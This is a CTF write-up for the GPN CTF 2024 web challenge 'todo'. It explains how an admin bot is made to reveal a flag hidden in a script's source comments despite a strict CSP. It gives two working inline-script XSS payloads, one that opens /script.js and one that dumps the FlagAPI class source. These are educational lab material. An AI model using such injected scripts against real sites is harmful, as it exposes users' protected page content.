---
title: GPN CTF 2024 - todo - web
published: true
---

The challenge is a simple express app with a bot and a very strict [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), which allows only for injected in-line javascript within `<script></script>` tags, and script from the same origin.

The bot visits the page, types in our HTML input, submits it and takes the screenshot of the page and sends it back to us.

## Unintended solution

We force the bot to open the `/script.js` containg the flag in the comment using an inline script tag, so we submit the following:

```html
<script>open("/script.js", "_self")</script>
```

## Intended solution

Most probably to override `toString` method of the `script.js` `FlagAPI` class, which looks as follows:

```js
class FlagAPI {
    constructor() {
        throw new Error("Not implemented yet!")
    }

    static valueOf() {
        return new FlagAPI()
    }

    static toString() {
        return "<FlagAPI>"
    }

    // TODO: Make sure that this is secure before deploying
    // getFlag() {
    //     return "GPNCTF{FAKE_FLAG_ADMINBOT_WILL_REPLACE_ME}"
    // }
}
```

The following payload would return the flag too:

```html
<script defer>
    let a = Function.prototype.toString.apply(FlagAPI);
    document.write(a);
</script>
```
